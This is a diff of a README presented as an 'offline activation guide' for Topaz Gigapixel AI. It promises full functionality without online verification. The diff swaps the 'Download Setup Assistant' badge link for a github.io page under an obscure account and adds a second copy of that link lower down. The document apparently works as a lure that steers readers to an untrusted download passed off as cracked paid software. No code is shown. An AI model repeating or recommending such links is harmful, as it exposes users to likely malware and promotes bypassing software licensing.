@@ -1,6 +1,6 @@
 # Topaz Gigapixel AI — Offline Activation Guide
 
-[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️%20Download%20Setup%20Assistant-%20Click%20to%20Start%20-%23007acc?style=for-the-badge)](https://topaz-gigapixel-ai-full-download.github.io/.github)
+[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️%20Download%20Setup%20Assistant-%20Click%20to%20Start%20-%23007acc?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/TopGig)
 
 > A complete offline setup assistant for Topaz Gigapixel AI. No online verification or login required. Upscale and enhance images with full functionality.
 
@@ -36,6 +36,8 @@
 
 ![Video vs Photo Mode in Gigapixel AI](https://images.hitpaw.com/topics/video-enhancer/topaz-photo-ai-vs-gigapixel-1.jpg)  
 *Comparison between Gigapixel AI for photo and video enhancement*
+
+[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️%20Download%20Setup%20Assistant-%20Click%20to%20Start%20-%23007acc?style=for-the-badge)](https://ryadikmntiiks.github.io/.github/TopGig)
 
 ---
 
